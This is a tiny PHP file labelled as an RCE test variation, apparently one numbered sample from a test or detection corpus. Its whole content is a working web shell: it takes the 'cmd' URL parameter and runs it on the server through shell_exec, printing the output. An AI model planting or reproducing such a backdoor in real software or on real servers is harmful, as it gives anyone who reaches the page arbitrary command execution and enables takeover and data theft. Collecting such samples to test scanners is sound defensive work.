<?php
// RCE test variation #641
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>